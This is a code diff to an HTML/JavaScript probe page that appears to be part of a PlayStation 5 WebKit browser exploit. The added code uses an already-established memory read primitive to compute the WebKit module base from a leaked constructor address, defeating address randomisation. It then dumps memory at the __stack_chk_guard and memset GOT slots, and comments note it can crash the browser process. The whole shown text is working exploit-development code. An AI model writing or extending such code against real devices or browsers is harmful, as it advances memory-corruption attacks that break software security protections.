@@ -38,6 +38,9 @@ a finding. One run per browser launch.</p>
 </div>
 <div><a tabindex="0" class="btn" id="clear">clear recorded trail</a></div>
 
+<h2>module-base probe</h2>
+<pre id="mods">(runs after PRIMITIVE-OK)</pre>
+
 <h2>rwHeader analysis</h2>
 <pre id="hdr">(nothing to analyse yet)</pre>
 
@@ -52,6 +55,7 @@ const TRAIL_KEY = "probe700:trail";
 const HDR_KEY = "probe700:hdr";
 const logEl = document.getElementById("log");
 const hdrEl = document.getElementById("hdr");
+const modsEl = document.getElementById("mods");
 const prevEl = document.getElementById("prev");
 const envEl = document.getElementById("env");
 
@@ -177,6 +181,46 @@ function loadOffsets() {
     });
 }
 
+// With the read primitive live, aim the carrier at the slots the profile calls
+// the memset / __stack_chk_guard GOT entries and print what is really there.
+// wkBase comes from core.js's own leak, exactly as main.js derives it.
+function dumpModuleSlots(core, carrier) {
+    const HC = 0x00010AE8;
+    const ctor = globalThis.__ps5NativeCtor;
+    if (typeof ctor !== "number") { modsEl.textContent = "no __ps5NativeCtor"; return; }
+    const base = ctor - HC;
+    let out = "ctor    = 0x" + ctor.toString(16) + "\n"
+            + "wkBase  = 0x" + base.toString(16)
+            + "  (aligned=" + (base % 0x4000 === 0) + ")\n\n";
+
+    function qwords(addr, n) {
+        carrier.aim(addr);
+        const v = carrier.view;
+        const rows = [];
+        for (let i = 0; i < n; i += 8) {
+            let q = 0;
+            for (let k = 7; k >= 0; k--) q = q * 256 + v[i + k];
+            let note = "";
+            if (q > base && q < base + 0x4500000) note = "  wk+0x" + (q - base).toString(16);
+            rows.push("  +0x" + i.toString(16).padStart(3, "0")
+                      + "  0x" + q.toString(16) + note);
+        }
+        carrier.restore();
+        return rows.join("\n");
+    }
+
+    const spots = [
+        ["wk+0x00000000 (module start)", base, 0x20],
+        ["wk+0x03E14900 (__stack_chk_guard slot at +0x10)", base + 0x03E14900, 0x40],
+        ["wk+0x03E16E80 (memset slot at +0x60)", base + 0x03E16E80, 0x80]
+    ];
+    for (const sp of spots) {
+        out += sp[0] + "\n" + qwords(sp[1], sp[2]) + "\n\n";
+    }
+    modsEl.textContent = out;
+    mark("MODPROBE-DONE", "wkBase=0x" + base.toString(16));
+}
+
 async function run(slots) {
     trail = [];
     logEl.textContent = "";
@@ -211,11 +255,14 @@ async function run(slots) {
     // Everything past here can take the WebProcess down natively. The trail is
     // already on disk, so the last mark tells us exactly where.
     try {
-        await core.establishPrimitive({
+        const carrier = await core.establishPrimitive({
             maxAttempts: 1,
             onEvent: function (tag, detail) { mark(tag, String(detail || "")); }
         });
         mark("PRIMITIVE-OK", "");
+        try { dumpModuleSlots(core, carrier); } catch (e) {
+            mark("MODPROBE-THREW", String(e && e.message));
+        }
     } catch (e) {
         mark("PRIMITIVE-THREW", String(e && e.message));
     }
